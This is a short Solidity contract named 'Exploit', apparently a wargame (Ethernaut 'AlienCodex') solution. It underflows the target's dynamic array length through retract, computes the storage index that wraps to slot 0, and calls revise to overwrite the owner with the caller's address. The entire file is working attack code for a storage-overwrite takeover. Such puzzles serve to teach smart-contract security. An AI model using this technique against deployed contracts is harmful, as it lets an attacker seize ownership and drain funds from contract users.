// SPDX-License-Identifier: MIT
pragma solidity 0.5.0;

contract Exploit {
    AlienCodex public alien;

    constructor(address _alien) public {
        alien = AlienCodex(_alien);
    }

    function Invasion() public {
        alien.makeContact();
        alien.retract(); // Cause underflow in storage.

        uint indexSlot0 = uint256(keccak256(abi.encode(1)));

        uint ownerSlot;
        ownerSlot -= indexSlot0; // get index of owner state variable
        alien.revise(ownerSlot, bytes32(uint256(msg.sender))); // OverWrite owner state variable.
    }
}  
